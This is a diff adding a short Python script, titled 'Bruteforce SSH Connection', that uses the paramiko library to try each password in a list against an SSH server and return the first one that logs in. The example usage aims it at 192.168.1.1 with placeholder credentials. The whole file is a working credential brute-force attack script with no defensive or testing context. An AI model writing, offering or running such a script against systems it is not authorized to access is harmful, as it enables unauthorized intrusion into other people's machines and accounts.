@@ -1,0 +1,30 @@
+# Bruteforce SSH Connection
+
+import paramiko
+import time
+
+def ssh_bruteforce(host, username, password_list):
+    for password in password_list:
+        try:
+            print(f"Trying password: {password}")
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host, username=username, password=password)
+            print(f"Password found: {password}")
+            client.close()
+            return password
+        except paramiko.AuthenticationException:
+            print(f"Password {password} failed.")
+            time.sleep(1)
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+    print("No valid password found.")
+    return None
+
+# Example usage
+host = "192.168.1.1"
+username = "your_username"
+password_list = ["password1", "password2", "password3"]
+
+ssh_bruteforce(host, username, password_list)
